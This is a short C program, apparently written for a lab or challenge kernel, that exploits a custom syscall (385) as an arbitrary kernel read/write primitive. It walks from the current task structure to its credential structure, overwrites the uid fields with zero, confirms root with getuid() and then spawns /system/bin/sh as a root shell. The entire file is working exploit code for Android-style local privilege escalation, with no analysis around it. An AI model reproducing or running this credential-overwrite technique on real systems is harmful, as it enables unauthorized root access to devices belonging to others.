#include <stdio.h>

void runExploit() {

    unsigned long ret = 0;
    
    syscall(385,0,NULL);

    ret = syscall(385,4,NULL);
    
    unsigned long p_taskp = ret + 12;
    syscall(385,2,p_taskp-4);
    ret = syscall(385,3,NULL);
    
    unsigned long p_credp = ret + 732;
    syscall(385,2,p_credp-4);
    ret = syscall(385,3,NULL);

    unsigned long p_uid = ret + 4;
    unsigned long p_prev_uid = p_uid - 8;

    for(unsigned long m = 0; m < 2; m++){
        for(unsigned long i = 0; i < 4; i++){
            syscall(385,0,NULL);
            int j;
            for (j = 1; j < 256; j++)
                syscall(385,1,j);
            syscall(385,2,(unsigned long)(p_prev_uid + i + m*16));
            syscall(385,1,j);
        }
    }
        return;
}

int main() {
    // Initial getuid(), should return non zero
    fprintf(stderr, "getuid() = %d\n", getuid());

    // The exploit itself
    runExploit();

    // If the exploit is successful, getuid() should return zero.
    fprintf(stderr, "getuid() = %d\n", getuid());

    if (getuid() == 0) {
        fprintf(stderr, "Trying to get a root shell.\n");
        char * sharg[] = {"/system/bin/sh", NULL};
        execv("/system/bin/sh", sharg); // You should see '#' at this point
    }

    return 0;
}
